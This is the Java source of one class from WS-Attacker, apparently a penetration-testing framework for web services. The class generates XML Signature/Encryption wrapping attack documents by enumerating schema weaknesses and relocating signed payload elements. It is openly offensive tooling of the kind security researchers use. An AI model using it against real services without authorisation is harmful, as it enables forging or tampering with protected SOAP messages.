/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles;

import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness.EncryptionSchemaWeakness;
import java.util.ArrayList;
import java.util.List;
import org.apache.log4j.Logger;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import wsattacker.library.schemaanalyzer.SchemaAnalyzer;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.signatureWrapping.xpath.weakness.util.WeaknessLog;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.util.WrapOracleHelper;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness.AbstractEncryptionWeakness;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness.FactoryWeakness;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness.WeaknessType;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionmanager.DetectFilterEnum;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionstreams.DetectionReport;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.SignatureInfo;
import wsattacker.library.xmlencryptionattack.encryptedelements.AbstractEncryptionElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.AbstractRefElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.ElementAttackProperties;
import wsattacker.library.xmlencryptionattack.encryptedelements.data.EncryptedDataElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.DataReferenceElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.EncryptedKeyElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.KeyReferenceElement;
import wsattacker.library.xmlutilities.dom.DomUtilities;

public class EncryptionWrappingOracle
    implements WrappingOracleIF
{

    private final Document m_OriginalDocument;

    private int m_MaxPossibilites;

    private final List<AbstractEncryptionWeakness> m_EncryptionWeakness = new ArrayList<AbstractEncryptionWeakness>();

    private final AbstractEncryptionElement m_EncPay;

    private final ElementAttackProperties m_EncPayAttackProp;

    public final static Logger LOG = Logger.getLogger( EncryptionWrappingOracle.class );

    private final SchemaAnalyzer m_SchemaAnalyzer;

    public EncryptionWrappingOracle( AbstractEncryptionElement encPay, DetectionReport detRep,
                                     SchemaAnalyzer schemaAnalyser )
        throws InvalidWeaknessException
    {
        SignatureInfo sigInfo = (SignatureInfo) detRep.getDetectionInfo( DetectFilterEnum.SIGNATUREFILTER );
        this.m_OriginalDocument = detRep.getRawFile();
        this.m_EncPay = encPay;
        this.m_MaxPossibilites = 0;
        this.m_SchemaAnalyzer = schemaAnalyser;

        if ( null == m_EncPay )
            LOG.error( "Error: No encryption element detected in EncWrappingOracle" );

        this.m_EncPayAttackProp = m_EncPay.getAttackProperties();

        if ( null == m_EncPayAttackProp )
            LOG.error( "Error: No Attack Properties set for Payload in EncryptionWrappingOracle" );

        if ( !sigInfo.isSignature() )
            LOG.info( "No signature detected" );

        initEncPayWeaknesses();
    }

    private void initEncPayWeaknesses()
        throws IllegalArgumentException, InvalidWeaknessException
    {
        if ( m_EncPay instanceof EncryptedKeyElement )
        {
            int idxEncDataPay = ( (EncryptedKeyElement) m_EncPay ).getWrappingEncDataIndex();
            List<AbstractRefElement> encRefs = ( (EncryptedKeyElement) m_EncPay ).getReferenceElementList();
            // encDatas of encKey signed??
            if ( encRefs.get( idxEncDataPay ) instanceof DataReferenceElement )
            {
                EncryptedDataElement encDataRef =
                    ( (DataReferenceElement) encRefs.get( idxEncDataPay ) ).getRefEncData();
                ElementAttackProperties attackProps = encDataRef.getAttackProperties();
                if ( attackProps.isSigned() || attackProps.isAdditionalWrap() )
                {
                    setEncryptionSchemaWeakness( encDataRef, (EncryptedKeyElement) m_EncPay );
                }
            }
            else if ( encRefs.get( idxEncDataPay ) instanceof KeyReferenceElement )
            {
                throw new IllegalArgumentException( "keyreference not supported yet!" );
            }
            // encKEy signed??
            if ( m_EncPayAttackProp.isSigned() || m_EncPayAttackProp.isAdditionalWrap() )
            {
                setEncryptionSchemaWeakness( (EncryptedKeyElement) m_EncPay, (EncryptedKeyElement) m_EncPay );
            }
        }
        else
        {
            initWeaknessesOfEncDataOnly();
        }
    }

    private void initWeaknessesOfEncDataOnly()
        throws IllegalArgumentException, InvalidWeaknessException
    {
        // seperate encDatas without encKeys
        if ( m_EncPay instanceof EncryptedDataElement )
        {
            if ( m_EncPayAttackProp.isSigned() || m_EncPayAttackProp.isAdditionalWrap() )
            {
                setEncryptionSchemaWeakness( m_EncPay, null );
                LOG.info( "Signed EncData without EncKey detected." );
            }
        }
        else
        {
            throw new IllegalArgumentException( "No valid EncryptionElement!" );
        }
    }

    final void setEncryptionSchemaWeakness( AbstractEncryptionElement encPay, EncryptedKeyElement encKey )
        throws InvalidWeaknessException
    {
        EncryptionSchemaWeakness encSchemWeak =
            (EncryptionSchemaWeakness) FactoryWeakness.generateWeakness( WeaknessType.SCHEMA_WEAKNESS, encPay, encKey );
        encSchemWeak.findSchemaWeakness( m_SchemaAnalyzer );
        setMaxPossibilites( encSchemWeak.getPossibleNumWeaks(), encPay.getEncryptedElement() );
        m_EncryptionWeakness.add( encSchemWeak );
    }

    @Override
    public int maxPossibilities()
    {
        return m_MaxPossibilites;
    }

    private void setMaxPossibilites( int numberOfPossibilites, Element payElement )
    {
        if ( numberOfPossibilites > 0 )
        {
            m_MaxPossibilites =
                ( m_MaxPossibilites == 0 ? numberOfPossibilites : m_MaxPossibilites * numberOfPossibilites );
        }
        else
        {
            LOG.info( "No Extensionpoints for " + payElement.getNodeName() + " detected / Skipping." );
        }
    }

    @Override
    public Document getPossibility( int index )
        throws InvalidWeaknessException
    {
        WeaknessLog.clean();
        LOG.info( "Creating Wrapping Possibility " + index + " of (" + m_MaxPossibilites + "-1)" );
        Document attackDocument = DomUtilities.createNewDomFromNode( m_OriginalDocument.getDocumentElement() );
        int weakPropIdx = 0;
        int currIdx = index;
        Element encKeyPay = null;

        if ( m_EncPay instanceof EncryptedKeyElement )
        {
            int idxEncDataPay = ( (EncryptedKeyElement) m_EncPay ).getWrappingEncDataIndex();
            List<AbstractRefElement> encRefs = ( (EncryptedKeyElement) m_EncPay ).getReferenceElementList();
            // encDatas signed??
            if ( encRefs.get( idxEncDataPay ) instanceof DataReferenceElement )
            {
                EncryptedDataElement encDataRef =
                    ( (DataReferenceElement) encRefs.get( idxEncDataPay ) ).getRefEncData();
                ElementAttackProperties attackProps = encDataRef.getAttackProperties();
                if ( attackProps.isSigned() || attackProps.isAdditionalWrap() )
                {
                    int possibility = index % m_EncryptionWeakness.get( weakPropIdx ).getPossibleNumWeaks();
                    index /= m_EncryptionWeakness.get( weakPropIdx ).getPossibleNumWeaks();
                    Element payElement = null;
                    try
                    {
                        payElement =
                            (Element) attackDocument.importNode( attackProps.getWrappingPayloadElement(), true );
                        attackProps.setAttackPayloadElement( payElement );
                        if ( m_EncPayAttackProp.isSigned() || m_EncPayAttackProp.isAdditionalWrap() )
                        {
                            encKeyPay =
                                (Element) attackDocument.importNode( m_EncPayAttackProp.getWrappingPayloadElement(),
                                                                     true );
                        }
                        else
                        {
                            encKeyPay =
                                DomUtilities.findCorrespondingElement( attackDocument, m_EncPay.getEncryptedElement() );
                        }
                        m_EncPayAttackProp.setAttackPayloadElement( encKeyPay );
                    }
                    catch ( Exception e )
                    {
                        LOG.error( "Could not get Payload Element for " + payElement.getNodeName() + " / Skipping." );
                    }

                    m_EncryptionWeakness.get( weakPropIdx ).abuseWeakness( possibility, encKeyPay, payElement );
                    LOG.info( String.format( payElement.getLocalName() + ": Wrapper @ %s",
                                             DomUtilities.getFastXPath( payElement ) ) );
                    weakPropIdx++;
                }
                else if ( encRefs.get( idxEncDataPay ) instanceof KeyReferenceElement )
                {
                    throw new IllegalArgumentException( "keyreference not supported yet!" );
                }
            }
            // encKey signed??
            if ( m_EncPayAttackProp.isSigned() || m_EncPayAttackProp.isAdditionalWrap() )
            {
                int possibility = index % m_EncryptionWeakness.get( weakPropIdx ).getPossibleNumWeaks();
                index /= m_EncryptionWeakness.get( weakPropIdx ).getPossibleNumWeaks();
                if ( null == encKeyPay ) // encData not signed => generate payload
                {
                    try
                    {
                        encKeyPay =
                            (Element) attackDocument.importNode( m_EncPayAttackProp.getWrappingPayloadElement(), true );
                        m_EncPayAttackProp.setAttackPayloadElement( encKeyPay );
                    }
                    catch ( Exception e )
                    {
                        LOG.error( "Could not get Payload Element for " + encKeyPay.getNodeName() + " / Skipping." );
                    }

                }
                m_EncryptionWeakness.get( weakPropIdx ).abuseWeakness( possibility, null, encKeyPay );
                LOG.info( String.format( encKeyPay.getLocalName() + ": Wrapper @ %s",
                                         DomUtilities.getFastXPath( encKeyPay ) ) );
                weakPropIdx++;
            }
        }

        weakPropIdx = handleEncDataOnly( index, weakPropIdx, attackDocument );
        handleAdditionalWeaknesses( currIdx, weakPropIdx );

        return attackDocument;
    }

    private int handleEncDataOnly( int index, int weakPropIdx, Document attackDocument )
        throws IllegalArgumentException
    {
        // handle encDatasOnly (without extern encKeys)
        Element payElement = null;
        if ( m_EncPay instanceof EncryptedDataElement )
        {
            if ( m_EncPayAttackProp.isSigned() || m_EncPayAttackProp.isAdditionalWrap() )
            {
                int possibility = index % m_EncryptionWeakness.get( weakPropIdx ).getPossibleNumWeaks();
                index /= m_EncryptionWeakness.get( weakPropIdx ).getPossibleNumWeaks();
                try
                {
                    payElement =
                        (Element) attackDocument.importNode( m_EncPayAttackProp.getWrappingPayloadElement(), true );
                    m_EncPayAttackProp.setAttackPayloadElement( payElement );

                    WrapOracleHelper.handleEncKeyInEncData( (EncryptedDataElement) m_EncPay );
                }
                catch ( Exception e )
                {
                    LOG.error( "Could not get Payload Element for " + payElement.getNodeName() + " / Skipping." );
                }
                m_EncryptionWeakness.get( weakPropIdx ).abuseWeakness( possibility, null, payElement );
                LOG.info( String.format( payElement.getLocalName() + ": Wrapper @ %s",
                                         DomUtilities.getFastXPath( payElement ) ) );
                weakPropIdx++;
            }
        }
        return weakPropIdx;
    }

    public void addAdditionalEncryptionWeakness( AbstractEncryptionWeakness addWeak )
    {
        int weaknessSize = m_EncryptionWeakness.size();
        m_EncryptionWeakness.add( addWeak );
        setMaxPossibilites( m_EncryptionWeakness.get( weaknessSize ).getPossibleNumWeaks(),
                            m_EncPay.getAttackProperties().getWrappingPayloadElement() );
    }

    // TODO: for multiple add Schemas
    private void handleAdditionalWeaknesses( int index, int weakPropIdx )
    {
        if ( 1 < m_EncryptionWeakness.size() && m_EncryptionWeakness.size() > weakPropIdx )
        {
            index /= ( m_EncryptionWeakness.get( weakPropIdx - 1 ).getPossibleNumWeaks() );
            int possibility = index % m_EncryptionWeakness.get( weakPropIdx ).getPossibleNumWeaks();
            if ( m_EncPay instanceof EncryptedDataElement )
            {
                m_EncryptionWeakness.get( weakPropIdx ).abuseWeakness( possibility,
                                                                       null,
                                                                       m_EncPay.getAttackProperties().getAttackPayloadElement() );
            }
            else if ( m_EncPay instanceof EncryptedKeyElement )
            {
                int idxEncDataPay = ( (EncryptedKeyElement) m_EncPay ).getWrappingEncDataIndex();
                List<AbstractRefElement> encRefs = ( (EncryptedKeyElement) m_EncPay ).getReferenceElementList();
                EncryptedDataElement encDataRef =
                    ( (DataReferenceElement) encRefs.get( idxEncDataPay ) ).getRefEncData();
                m_EncryptionWeakness.get( weakPropIdx ).abuseWeakness( possibility,
                                                                       m_EncPay.getAttackProperties().getAttackPayloadElement(),
                                                                       encDataRef.getAttackProperties().getAttackPayloadElement() );
            }
            weakPropIdx++;
        }
    }
}
